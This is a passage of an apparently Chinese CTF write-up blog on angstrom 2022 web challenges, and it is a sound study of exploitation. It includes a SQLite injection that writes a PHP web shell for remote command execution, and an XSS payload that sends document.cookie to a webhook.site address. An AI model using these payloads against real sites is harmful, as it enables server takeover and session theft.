+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM php:8.1.5-apache-bullseye</span><br><span class="line"></span><br><span class="line"># executable that prints the flag</span><br><span class="line">COPY printflag /printflag</span><br><span class="line">RUN chmod 111 /printflag</span><br><span class="line">COPY src /var/www/html</span><br><span class="line"></span><br><span class="line">RUN chown -R root:root /var/www/html &amp;&amp; chmod -R 555 /var/www/html</span><br><span class="line">RUN mkdir /var/www/html/abyss &amp;&amp;\</span><br><span class="line">    chown -R root:root /var/www/html/abyss &amp;&amp;\</span><br><span class="line">    chmod -R 333 abyss</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;DBNAME&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$dbname</span> = hash(<span class="string">&quot;sha256&quot;</span>, (<span class="keyword">string</span>) rand());</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;DBNAME&quot;</span>] = <span class="variable">$dbname</span>;</span><br><span class="line">        <span class="variable">$init</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$dbname</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;DBNAME&quot;</span>];</span><br><span class="line">        <span class="variable">$init</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&quot;sqlite:/tmp/<span class="subst">$dbname</span>.db&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$init</span>) &#123;</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;exec(<span class="string">&quot;CREATE TABLE Flags (flag string); INSERT INTO Flags VALUES (&#x27;actf&#123;not_the_flag&#125;&#x27;), (&#x27;actf&#123;maybe_the_flag&#125;&#x27;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        <span class="variable">$pdo</span>-&gt;exec(<span class="string">&quot;INSERT INTO Flags VALUES (&#x27;<span class="subst">$flag</span>&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;SELECT * FROM Flags&quot;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . htmlspecialchars(<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>]) . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在dockerfile中发现是需要我们执行printflag这个文件</p>
+<p>而他给我们的abyss这个文件夹的写入权限</p>
+<p>也就是我们需要找到方法写入shell</p>
+<p>发现我们输入点在这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pdo-&gt;exec(&quot;INSERT INTO Flags VALUES (&#x27;$flag&#x27;);&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>所以我们直接构造闭合然后船舰我们自己的数据库即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">flag=&#x27;); ATTACH DATABASE &#x27;/var/www/html/abyss/paixiaoxing.php&#x27; AS paixiaoxing; CREATE TABLE paixiaoxing.pwn (dataz text); INSERT INTO paixiaoxing.pwn (dataz) VALUES (&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;); -- paixiaoxing</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">分解一下：</span><br><span class="line">flag=&#x27;); 构造闭合</span><br><span class="line">ATTACH DATABASE &#x27;/var/www/html/abyss/paixiaoxing.php&#x27; AS paixiaoxing; #在这个文件中附加一个数据库</span><br><span class="line">CREATE TABLE paixiaoxing.pwn (dataz text); 在这个数据库中创建一个表</span><br><span class="line">INSERT INTO paixiaoxing.pwn (dataz) VALUES (&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;); -- paixiaoxing#将我们的shell写入之前创建的php中然后将后面的进行闭合</span><br></pre></td></tr></table></figure>
+
+<p>成功RCE</p>
+<p><img src="/2022/05/08/angstorm%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p>
+<p>flag:<code>acrf&#123;why_do_people_still_use_php&#125;</code></p>
+<h2 id="Cliche"><a href="#Cliche" class="headerlink" title="Cliche"></a><strong>Cliche</strong></h2><p>作者提示，用了三种方法<code>“pastebin”、“markdown”和“input sanitization”</code></p>
+<p>而且他就是让我们在一个文本框中输入一些解析代码，让他能够正确执行</p>
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`%3Cp%20x=%22%3Cimg%20src=x%20onerror=fetch(window.location.hash.substring(1)%2Bdocument.cookie)%3Efoo%3C/img%3E%22%20title=%22hello`%22%3E%3Cimg%20src=x%3E%3C/p%3E#https://webhook.site/dd2b648b-af60-4435-aaa3-6c6f08d801bb?x=</span><br><span class="line"></span><br><span class="line">也就是：</span><br><span class="line">`&lt;p x=&quot;&lt;img src=x onerror=fetch(window.location.hash.substring(1)+document.cookie)&gt;foo&lt;/img&gt;&quot; title=&quot;hello`&quot;&gt;&lt;img src=x&gt;&lt;/p&gt;#https://webhook.site/dd2b648b-af60-4435-aaa3-6c6f08d801bb?x=</span><br></pre></td></tr></table></figure>
+
+<p>我们需要让他弹出自己的cookie到我们的webhook</p>
+<p>而一般的标签是没有用的，需要用的markdown里面的反引号闭合来破坏他的编辑，成功执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">`&lt;px=&quot;`&lt;img src=x onerror=alert(1)&gt;&quot;&gt;&lt;/p&gt;</span><br><span class="line">在经过三重解析之后变成</span><br><span class="line">&lt;p&gt;&lt;code&gt;&lt;p id=&quot;&lt;/code&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">虽然他被破坏，但是我们放置其中的恶意代码是成功闭合能够正确执行的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window.location.hash.substring(1)</span><br><span class="line">似乎是用来匹配#号的，没有深入js不是很明白，等以后学到了，再来补全</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：angstorm比赛复现</li>
+        <li>Post author：paixiaoxing</li>
+        <li>Create time：2022-05-08 15:44:12</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2022/05/08/angstorm比赛复现/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/angstorm2022/">#angstorm2022</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/05/05/CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-web4/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CISCN-2019华东南-web4</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">paixiaoxing</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#angstorm%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">angstorm比赛复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#School-Unblocker"><span class="nav-number">1.1.</span> <span class="nav-text">School Unblocker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Secure-Vault"><span class="nav-number">1.2.</span> <span class="nav-text">Secure Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-Flags"><span class="nav-number">1.3.</span> <span class="nav-text">No Flags?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cliche"><span class="nav-number">1.4.</span> <span class="nav-text">Cliche</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
